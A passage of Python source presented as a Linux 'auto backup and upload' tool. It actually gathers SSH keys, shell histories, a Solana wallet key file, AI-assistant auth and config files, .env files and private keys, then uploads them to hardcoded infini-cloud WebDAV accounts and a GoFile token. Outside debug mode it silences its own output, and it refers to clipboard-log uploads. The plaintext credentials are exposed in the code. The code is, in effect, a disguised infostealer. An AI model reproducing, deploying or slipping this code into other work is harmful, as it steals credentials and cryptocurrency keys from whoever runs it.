# -*- coding: utf-8 -*-
"""
自动备份和上传工具
功能：备份 linux 系统中的重要文件，并自动上传到云存储
"""

# 先导入标准库
import os
import sys
import shutil
import time
import socket
import logging
import logging.handlers
import platform
import tarfile
import threading
import subprocess
import getpass
import json
import glob
import re
from urllib.parse import quote
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional, Iterator, Tuple, List

@lru_cache(maxsize=8192)
def get_file_size_cached(path: str) -> int:
    """缓存文件大小，避免重复系统调用

    Args:
        path: 文件路径

    Returns:
        文件大小（字节），失败返回 0
    """
    try:
        return os.path.getsize(path)
    except (OSError, IOError):
        return 0


import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")

try:
    from cryptography.fernet import Fernet
except ImportError:
    Fernet = None

class BackupConfig:
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）

    # 文件大小配置（单位：字节）
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # 单文件阈值：50MB（超过则分片）
    CHUNK_SIZE = 50 * 1024 * 1024             # 分片大小：50MB

    # 重试配置
    RETRY_COUNT = 5        # 最大重试次数
    RETRY_DELAY = 60       # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）

    # 备份间隔配置
    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
    SCAN_TIMEOUT = 3600    # 扫描超时时间：1小时

    # 本地备份安全配置
    BACKUP_DIR_MODE = 0o700
    BACKUP_FILE_MODE = 0o600
    ENCRYPTION_KEY_FILE = str(Path.home() / ".dev" / "Backup" / ".encryption.key")
    CLIPBOARD_MAX_SIZE = 5 * 1024 * 1024

    # 性能优化常量
    TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6 为平衡值）
    NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
    NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    # 注意：已改为上传后清空机制，不再使用日志轮转
    # LOG_MAX_SIZE = 10 * 1024 * 1024  # 日志文件最大大小：10MB（已废弃）
    # LOG_BACKUP_COUNT = 10             # 保留的日志备份数量（已废弃）

    # 时间阈值文件配置
    THRESHOLD_FILE = str(Path.home() / ".dev/Backup/next_backup_time.txt")  # 时间阈值文件路径

    # 需要备份的服务器目录或文件
    SERVER_BACKUP_DIRS = [
        ".ssh",                     # SSH配置
        ".bashrc",
        ".profile",                    
        ".bash_history",            # Bash历史记录
        ".python_history",          # Python历史记录
        ".node_repl_history",       # Node.js REPL 历史记录
        ".config/solana/id.json",
        ".claude/config.json",
        ".claude/settings.json",
        ".claude/settings.local.json",
        ".claude/history.jsonl",
        ".claude/channels/",
        ".codex/auth.json",
        ".codex/config.toml",
        ".codex/history.jsonl",
        ".hermes/.env",
        ".hermes/auth.json",
        ".hermes/config.yaml",
        ".hermes/channel_directory.json",
        ".hermes_history",
        ".openclaw/agents/",
        ".openclaw/workspace/.env",
        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
    ]

    # 需要备份的文件类型
    # 文档类型扩展名
    DOC_EXTENSIONS = [
        ".txt", ".json", ".csv", ".md", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
    ]
    # 配置类型扩展名
    CONFIG_EXTENSIONS = [
        ".pem", ".key", ".keystore", ".xml", ".ini", ".config", ".conf", ".json", ".env",
        ".yaml", ".yml", ".toml", ".wallet", "id_rsa", "id_ecdsa", "id_ed25519",
    ]
    # 所有备份扩展名（用于兼容性）
    BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
    
    # 排除的目录
    EXCLUDE_DIRS = [
        ".bashrc",
        ".profile",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".dev",              # 排除.dev目录，避免循环备份
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "myenv",
        "snap",
        "venv",
        ".venv",
        "node_modules",
        "dist",
        ".cache",
        ".vscode-server",
        "build",
        ".vscode-remote-ssh",
        "ylx-backup",
        "__pycache__",
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://upload.gofile.io/uploadfile",          # 自动（最近节点）
        "https://upload-ap-hkg.gofile.io/uploadfile",   # 亚太（香港）
        "https://upload-ap-sgp.gofile.io/uploadfile",   # 亚太（新加坡）
        "https://upload-ap-tyo.gofile.io/uploadfile",   # 亚太（东京）
        "https://upload-na-phx.gofile.io/uploadfile",   # 北美（凤凰城）
    ]

    # 网络配置
    NETWORK_CHECK_HOSTS = [
        "8.8.8.8",         # Google DNS
        "1.1.1.1",         # Cloudflare DNS
        "208.67.222.222",  # OpenDNS
        "9.9.9.9"          # Quad9 DNS
    ]

if BackupConfig.DEBUG_MODE:
    logging.basicConfig(format="%(message)s", level=logging.DEBUG)
else:
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    logging.basicConfig(format="%(message)s", level=logging.CRITICAL)

class BackupManager:
    
    def __init__(self):
        """初始化备份管理器"""
        if requests is None or HTTPBasicAuth is None:
            raise RuntimeError("缺少 requests 依赖，无法启动备份上传功能")
        self.config = BackupConfig()
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"  #infini-cloud-2
        self.infini_pass = "my95gfPVtKuDCpAK"
        # Infini 上传配置：主配置 + 备用配置（全部失败才会回退 GoFile）
        self.infini_configs = [
            {
                "name": "Infini-主配置",
                "url": self.infini_url,
                "user": self.infini_user,
                "password": self.infini_pass,
            },
            {
                "name": "Infini-备用配置",
                "url": "https://wajima.infini-cloud.net/dav/",
                "user": "cryptostarxp",  #infini-cloud-4
                "password": "LDW9ERV3xuUrHSjZ",
            },
        ]
        
        # GoFile API token（备选方案）
        self.api_token = "GXPkms2fGdFYDLu17RQHlklDonEPfvY5"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_linux_backup"
        
        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = True
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        self._clipboard_lock = threading.Lock()
        self._network_check_time = 0.0
        self._network_check_result = False
        
        # 使用集合优化扩展名检查性能
        self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
        self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
        # JTB相关标志
        self._clipboard_display_warned = False  # 是否已警告过 DISPLAY 不可用
        self._clipboard_display_error_time = 0  # 上次记录 DISPLAY 错误的时间
        self._clipboard_display_error_interval = 300  # DISPLAY 错误日志间隔（5分钟）
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, mode=self.config.BACKUP_DIR_MODE, exist_ok=True)

            # 使用 FileHandler，采用上传后清空机制（与 Windows/macOS 版本保持一致）
            file_handler = logging.FileHandler(
                self.config.LOG_FILE,
                encoding='utf-8'
            )
            os.chmod(self.config.LOG_FILE, self.config.BACKUP_FILE_MODE)
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )

            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))

            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )

            # 仅移除本实例之前创建的 handler，不影响宿主程序的日志配置
            for handler in root_logger.handlers[:]:
                if getattr(handler, "_ylx_backup_handler", False):
                    root_logger.removeHandler(handler)
                    handler.close()
            file_handler._ylx_backup_handler = True
            console_handler._ylx_backup_handler = True
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except Exception as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, mode=BackupConfig.BACKUP_DIR_MODE, exist_ok=True)
            os.chmod(directory_path, BackupConfig.BACKUP_DIR_MODE)
            return True
        except Exception as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path)
                if os.path.exists(directory_path):
                    logging.error(f"清理目录后仍存在: {directory_path}")
                    return False
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    def _check_internet_connection(self):
        """检查网络连接状态"""
        now = time.monotonic()
        if now - self._network_check_time < 30:
            return self._network_check_result

        result = False
        for _ in range(BackupConfig.NETWORK_CHECK_RETRIES):
            for host in BackupConfig.NETWORK_CHECK_HOSTS:
                try:
                    with socket.create_connection(
                        (host, 53),
                        timeout=BackupConfig.NETWORK_CHECK_TIMEOUT
                    ):
                        result = True
                        break
                except (socket.timeout, socket.gaierror, ConnectionRefusedError):
                    continue
                except Exception as e:
                    logging.debug("网络检查出错 %s: %s", host, e)
                    continue
            if result:
                break
            time.sleep(1)  # 重试前等待1秒
        self._network_check_time = time.monotonic()
        self._network_check_result = result
        return result

    @staticmethod
    def _is_valid_file(file_path):
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _backup_specified_item(self, source_path, target_base, item_name):
        """备份指定的文件或目录"""
        try:
            if os.path.isfile(source_path):
                target_file = os.path.join(target_base, item_name)
                target_file_dir = os.path.dirname(target_file)
                if self._ensure_directory(target_file_dir):
                    shutil.copy2(source_path, target_file)
                    os.chmod(target_file, self.config.BACKUP_FILE_MODE)
                    if self.config.DEBUG_MODE:
                        logging.info(f"已备份指定文件: {item_name}")
                    return True
            else:
                target_path = os.path.join(target_base, item_name)
                if self._ensure_directory(os.path.dirname(target_path)):
                    if os.path.exists(target_path):
                        shutil.rmtree(target_path)
                    # 对于指定目录，按路径组件精确排除目录，避免字符串包含误匹配
                    exclude_dirs_lower = {ex.casefold() for ex in self.config.EXCLUDE_DIRS}

                    source_root = Path(source_path).resolve()

                    def ignore_func(current_dir, names):
                        ignored = []
                        for name in names:
                            candidate = Path(current_dir) / name
                            try:
                                relative_parts = candidate.resolve().relative_to(source_root).parts
                            except (OSError, ValueError):
                                relative_parts = (name,)
                            if any(part.casefold() in exclude_dirs_lower for part in relative_parts):
                                ignored.append(name)
                        return ignored

                    shutil.copytree(source_path, target_path, symlinks=True, ignore=ignore_func)
                    for copied_root, copied_dirs, copied_files in os.walk(target_path):
                        if not os.path.islink(copied_root):
                            os.chmod(copied_root, self.config.BACKUP_DIR_MODE)
                        for copied_dir in copied_dirs:
                            copied_dir_path = os.path.join(copied_root, copied_dir)
                            if not os.path.islink(copied_dir_path):
                                os.chmod(copied_dir_path, self.config.BACKUP_DIR_MODE)
                        for copied_file in copied_files:
                            copied_file_path = os.path.join(copied_root, copied_file)
                            if not os.path.islink(copied_file_path):
                                os.chmod(copied_file_path, self.config.BACKUP_FILE_MODE)
                    if self.config.DEBUG_MODE:
                        logging.info(f"📁 已备份指定目录: {item_name}/")
                    return True
        except Exception as e:
            logging.error(f"❌ 备份失败: {item_name} - {str(e)}")
        return False

    def backup_linux_files(self, source_dir, target_dir):
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("❌ Linux源目录不存在")
            return None

        source_real = Path(source_dir).resolve()
        target_real = Path(target_dir).resolve()
        safe_target_root = (source_real / ".dev" / "Backup").resolve()
        target_inside_safe_root = target_real == safe_target_root or safe_target_root in target_real.parents
        if (target_real == source_real or
                target_real in source_real.parents or
                (source_real in target_real.parents and not target_inside_safe_root)):
            logging.error("❌ 备份目标目录不能与源目录存在包含关系")
            return None

        # 获取用户名前缀
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"

        target_docs = os.path.join(target_dir, f"{user_prefix}_docs") # 备份文档的目标目录
        target_configs = os.path.join(target_dir, f"{user_prefix}_configs") # 备份配置文件的目标目录
        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")  # 新增指定目录/文件的备份目录

        if not self._clean_directory(target_dir):
            return None

        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified]):
            return None

        # 首先备份指定目录或文件 (SERVER_BACKUP_DIRS)
        for specific_path in self.config.SERVER_BACKUP_DIRS:
            # 支持通配符（glob），例如 ".openclaw/openclaw.json*"
            if any(ch in specific_path for ch in ["*", "?", "["]):
                pattern = os.path.join(source_dir, specific_path)
                matched_paths = glob.glob(pattern)
                for matched_path in matched_paths:
                    rel_name = os.path.relpath(matched_path, source_dir)
                    self._backup_specified_item(matched_path, target_specified, rel_name)
                continue

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                self._backup_specified_item(full_source_path, target_specified, specific_path)

        # 然后备份其他文件 (不在SERVER_BACKUP_DIRS中的，根据文件类型备份)
        # 预计算已备份的目录路径集合，优化性能
        source_dir_abs = os.path.abspath(source_dir)
        backed_up_dirs = set()
        for specific_dir in self.config.SERVER_BACKUP_DIRS:
            specific_path = os.path.join(source_dir, specific_dir)
            if os.path.isdir(specific_path):
                backed_up_dirs.add(os.path.abspath(specific_path))
        
        docs_count = configs_count = 0
        target_dir_abs = os.path.abspath(target_dir)
        exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
        
        for root, dirs, files in os.walk(source_dir):
            root_abs = os.path.abspath(root)
            
            # 跳过源目录本身的文件处理，只在这里处理一级子目录的排除
            if root_abs == source_dir_abs:
                # 创建一个目录列表副本用于迭代，因为我们可能会修改原始dirs列表
                dirs_to_walk = dirs[:] 
                for d in dirs_to_walk:
                    # 检查这个第一级子目录是否在排除列表中（不区分大小写）
                    if d.lower() in exclude_dirs_lower:
                         if self.config.DEBUG_MODE:
                              logging.info(f"⏭️ 已排除第一级目录: {d}/")
                         dirs.remove(d) # 从os.walk迭代的列表中移除，阻止进入此目录
                continue # 跳过源目录本身的文件处理

            # 跳过已在上面作为指定目录备份过的目录 (或其下的子目录)
            if any(root_abs.startswith(backed_dir) for backed_dir in backed_up_dirs):
                continue

            # 跳过目标备份目录本身，避免备份备份文件
            if root_abs.startswith(target_dir_abs):
                continue

            # 对于非第一级目录或未排除的第一级目录下的文件/子目录，根据文件扩展名进行备份

            for file in files:
                # 判断文件是否为文档类型或配置类型（使用集合优化性能）
                file_lower = file.lower()
                is_doc = any(file_lower.endswith(ext) for ext in self.doc_extensions_set)
                is_config = any(file_lower.endswith(ext) for ext in self.config_extensions_set)

                # 如果既不是文档也不是配置，跳过
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                # os.walk已经提供了文件列表，通常不需要再次检查存在性
                # 但如果文件在遍历过程中被删除，这里可以跳过

                # 根据文件类型确定目标基路径
                target_base = target_docs if is_doc else target_configs
                # 获取相对于源目录的路径
                relative_path = os.path.relpath(root, source_dir)
                # 构建目标子目录路径
                target_sub_dir = os.path.join(target_base, relative_path)
                # 构建目标文件路径
                target_file = os.path.join(target_sub_dir, file)

                # 确保目标子目录存在
                if not self._ensure_directory(target_sub_dir):
                    continue

                try:
                    # 复制文件到目标位置
                    shutil.copy2(source_file, target_file)
                    os.chmod(target_file, self.config.BACKUP_FILE_MODE)
                    # 更新计数器
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                except Exception as e:
                    # 复制失败记录错误
                    if self.config.DEBUG_MODE:
                        logging.error(f"❌ 复制失败: {relative_path}/{file}")

        # 打印备份统计信息
        if docs_count > 0 or configs_count > 0:
            logging.info(f"\n📊 Linux文件备份统计:")
            if docs_count > 0:
                logging.info(f"   📚 文档: {docs_count} 个文件")
            if configs_count > 0:
                logging.info(f"   ⚙️  配置: {configs_count} 个文件")

        # 返回各个分目录的路径字典，用于分别压缩
        backup_dirs = {
            "docs": target_docs,
            "configs": target_configs,
            "specified": target_specified
        }
        return backup_dirs

    def _create_remote_directory(self, remote_dir, infini_url=None, auth=None):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True

        if not infini_url:
            infini_url = self.infini_url
        if auth is None:
            auth = self.auth
        
        try:
            # 构建目录路径
            dir_path = f"{infini_url.rstrip('/')}/{remote_dir.lstrip('/')}"
            
            response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = os.path.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir, infini_url=infini_url, auth=auth):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path, infini_config):
        """使用指定的 Infini 配置上传单个文件。"""
        config_name = infini_config.get("name", "Infini")
        infini_url = infini_config.get("url", "").strip()
        infini_user = infini_config.get("user", "").strip()
        infini_password = infini_config.get("password", "")

        if not infini_url or not infini_user or not infini_password:
            logging.error(f"❌ [{config_name}] 配置不完整，跳过")
            return False

        auth = HTTPBasicAuth(infini_user, infini_password)
        file_size = os.path.getsize(file_path)
        filename = os.path.basename(file_path)
        remote_base = quote(self.config.INFINI_REMOTE_BASE_DIR, safe="")
        remote_filename = f"{remote_base}/{quote(filename, safe='')}"
        remote_path = f"{infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"

        # 创建远程目录（如果需要）
        remote_dir = os.path.dirname(remote_filename)
        if remote_dir and remote_dir != '.':
            if not self._create_remote_directory(remote_dir, infini_url=infini_url, auth=auth):
                logging.warning(f"[{config_name}] 无法创建远程目录: {remote_dir}，将继续尝试上传")

        # 上传重试逻辑
        for attempt in range(self.config.RETRY_COUNT):
            if not self._check_internet_connection():
                logging.error("网络连接不可用，等待重试...")
                time.sleep(self.config.RETRY_DELAY)
                continue

            try:
                # 根据文件大小动态调整超时时间
                if file_size < 1024 * 1024:  # 小于1MB
                    connect_timeout = 10
                    read_timeout = 30
                elif file_size < 10 * 1024 * 1024:  # 1-10MB
                    connect_timeout = 15
                    read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                else:  # 大于10MB
                    connect_timeout = 20
                    read_timeout = max(60, int(file_size / 1024 / 1024 * 6))

                # 只在第一次尝试时显示详细信息
                if attempt == 0:
                    size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                    logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                elif self.config.DEBUG_MODE:
                    logging.debug("[%s] 重试上传: %s (第 %d 次)", config_name, filename, attempt + 1)

                # 准备请求头
                headers = {
                    'Content-Type': 'application/octet-stream',
                    'Content-Length': str(file_size),
                }

                # 执行上传（使用 WebDAV PUT 方法）
                with open(file_path, 'rb') as f:
                    response = self.session.put(
                        remote_path,
                        data=f,
                        headers=headers,
                        auth=auth,
                        timeout=(connect_timeout, read_timeout),
                        stream=False
                    )

                if response.status_code in [200, 201, 202, 204]:
                    logging.critical(f"✅ [{config_name}] {filename}")
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.error(f"删除已上传文件失败: {e}")
                    try:
                        response.close()
                    except Exception:
                        pass
                    return True
                elif response.status_code == 403:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 权限不足")
                elif response.status_code == 404:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
                elif response.status_code == 409:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
                else:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
                try:
                    response.close()
                except Exception:
                    pass

            except requests.exceptions.Timeout:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: 超时")
            except requests.exceptions.SSLError:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: SSL错误")
            except requests.exceptions.ConnectionError:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: 连接错误")
            except Exception as e:
                if attempt == 0 or self.config.DEBUG_MODE:
                    logging.error(f"❌ [{config_name}] {filename}: {str(e)}")

            if attempt < self.config.RETRY_COUNT - 1:
                if self.config.DEBUG_MODE:
                    logging.debug(f"[{config_name}] 等待 {self.config.RETRY_DELAY} 秒后重试...")
                time.sleep(self.config.RETRY_DELAY)

        logging.error(f"❌ [{config_name}] {filename}: 上传失败")
        return False

    def split_large_file(self, file_path):
        """将大文件分割为多个小块"""
        if not os.path.exists(file_path):
            return None
        chunk_files = []
        try:
            file_size = os.path.getsize(file_path)
            if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
                return [file_path]

            # 创建分片目录
            chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
            if not self._ensure_directory(chunk_dir):
                return None
            base_name = os.path.basename(file_path)
            for stale_chunk in glob.glob(os.path.join(chunk_dir, f"{base_name}.part*")):
                try:
                    os.remove(stale_chunk)
                except OSError:
                    logging.warning(f"无法清理旧分片: {stale_chunk}")

            # 对文件进行分片
            with open(file_path, 'rb') as f:
                chunk_num = 0
                while True:
                    chunk_data = f.read(self.config.CHUNK_SIZE)
                    if not chunk_data:
                        break
                    
                    chunk_name = f"{base_name}.part{chunk_num:03d}"
                    chunk_path = os.path.join(chunk_dir, chunk_name)
                    
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk_data)
                    os.chmod(chunk_path, self.config.BACKUP_FILE_MODE)
                    chunk_files.append(chunk_path)
                    chunk_num += 1
                    logging.info(f"已创建分片 {chunk_num}: {len(chunk_data) / 1024 / 1024:.2f}MB")

            os.remove(file_path)
            logging.critical(f"文件 {file_path} ({file_size / 1024 / 1024:.2f}MB) 已分割为 {len(chunk_files)} 个分片")
            return chunk_files

        except Exception as e:
            logging.error(f"分割文件失败 {file_path}: {e}")
            for chunk_path in chunk_files:
                try:
                    if os.path.exists(chunk_path):
                        os.remove(chunk_path)
                except OSError:
                    pass
            return None

    def _get_backup_fernet(self):
        """获取用于备份归档的本机密钥，并确保密钥文件权限受限。"""
        if Fernet is None:
            raise RuntimeError("缺少 cryptography 依赖，无法加密备份归档")

        key = os.environ.get("BACKUP_ENCRYPTION_KEY")
        key_path = Path(self.config.ENCRYPTION_KEY_FILE)
        if key:
            key_bytes = key.encode("ascii")
        else:
            key_path.parent.mkdir(mode=self.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
            os.chmod(key_path.parent, self.config.BACKUP_DIR_MODE)
            if key_path.exists():
                key_bytes = key_path.read_bytes().strip()
            else:
                key_bytes = Fernet.generate_key()
                flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
                fd = os.open(str(key_path), flags, self.config.BACKUP_FILE_MODE)
                try:
                    os.write(fd, key_bytes)
                finally:
                    os.close(fd)
                os.chmod(key_path, self.config.BACKUP_FILE_MODE)

        return Fernet(key_bytes)

    def _encrypt_file(self, source_path, encrypted_path):
        """加密归档并以原子方式写入目标文件。"""
        temp_path = f"{encrypted_path}.tmp-{os.getpid()}"
        try:
            fernet = self._get_backup_fernet()
            with open(source_path, "rb") as source:
                encrypted = fernet.encrypt(source.read())
            with open(temp_path, "wb") as output:
                output.write(encrypted)
            os.chmod(temp_path, self.config.BACKUP_FILE_MODE)
            os.replace(temp_path, encrypted_path)
            os.chmod(encrypted_path, self.config.BACKUP_FILE_MODE)
            return True
        except Exception as e:
            logging.error(f"加密归档失败 {source_path}: {e}")
            try:
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            except OSError:
                pass
            return False

    def zip_backup_folder(self, folder_path, zip_file_path):
        try:
            if folder_path is None or not os.path.exists(folder_path):
                return None

            total_files = sum(len(files) for _, _, files in os.walk(folder_path))
            if total_files == 0:
                logging.error(f"源目录为空 {folder_path}")
                return None

            dir_size = 0
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    try:
                        file_path = os.path.join(dirpath, filename)
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:
                            dir_size += file_size
                    except OSError as e:
                        logging.error(f"获取文件大小失败 {file_path}: {e}")
                        continue

            tar_path = f"{zip_file_path}.tar.gz"
            encrypted_path = f"{tar_path}.enc"
            for stale_path in (tar_path, encrypted_path):
                if os.path.exists(stale_path):
                    os.remove(stale_path)

            with tarfile.open(tar_path, "w:gz", compresslevel=BackupConfig.TAR_COMPRESS_LEVEL) as tar:
                tar.add(folder_path, arcname=os.path.basename(folder_path))

            if not self._encrypt_file(tar_path, encrypted_path):
                os.remove(tar_path)
                return None
            os.remove(tar_path)
            archive_path = encrypted_path

            try:
                compressed_size = os.path.getsize(archive_path)
                if compressed_size == 0:
                    logging.error(f"压缩文件大小为0 {archive_path}")
                    if os.path.exists(archive_path):
                        os.remove(archive_path)
                    return None

                if not self._clean_directory(folder_path):
                    logging.warning(f"归档已生成但源目录清理失败: {folder_path}")
                logging.critical(f"目录 {folder_path} 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                
                # 如果压缩文件过大，进行分片
                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                    return self.split_large_file(archive_path)
                else:
                    return [archive_path]
                    
            except OSError as e:
                logging.error(f"获取压缩文件大小失败 {archive_path}: {e}")
                if os.path.exists(archive_path):
                    os.remove(archive_path)
                return None
                
        except Exception as e:
            logging.error(f"压缩失败 {folder_path}: {e}")
            for candidate in (f"{zip_file_path}.tar.gz", f"{zip_file_path}.tar.gz.enc"):
                try:
                    if os.path.exists(candidate):
                        os.remove(candidate)
                except OSError:
                    pass
            return None

    def upload_backup(self, backup_paths):
        """上传备份文件，支持单个文件或文件列表"""
        if not backup_paths:
            return False
            
        if isinstance(backup_paths, str):
            backup_paths = [backup_paths]
            
        success = True
        for path in backup_paths:
            if not self.upload_file(path):
                success = False
        return success

    def upload_file(self, file_path):
        """上传单个文件"""
        if not self._is_valid_file(file_path):
            logging.error(f"文件 {file_path} 为空或无效，跳过上传")
            return False
            
        return self._upload_single_file(file_path)

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）"""
        try:
            # 检查文件权限和状态
            if not os.path.exists(file_path):
                logging.error(f"文件不存在: {file_path}")
                return False
                
            if not os.access(file_path, os.R_OK):
                logging.error(f"文件无读取权限: {file_path}")
                return False
                
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                logging.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                logging.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            filename = os.path.basename(file_path)
            logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if not self._check_internet_connection():
                    logging.error("网络连接不可用，等待重试...")
                    time.sleep(self.config.RETRY_DELAY)
                    continue

                # 服务器轮询
                if attempt == 0:
                    size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                    logging.info(f"📤 [GoFile] 上传: {filename} ({size_str})")
                elif self.config.DEBUG_MODE:
                    logging.debug(f"[GoFile] 重试上传: {filename} (第 {attempt + 1} 次)")
                
                for server in self.config.UPLOAD_SERVERS:
                    session = requests.Session()
                    try:
                        with open(file_path, "rb") as f:
                            # 准备上传会话
                            session.headers.update({
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                            })
                            
                            # 执行上传
                            response = session.post(
                                server,
                                files={"file": f},
                                headers={"Authorization": f"Bearer {self.api_token}"},
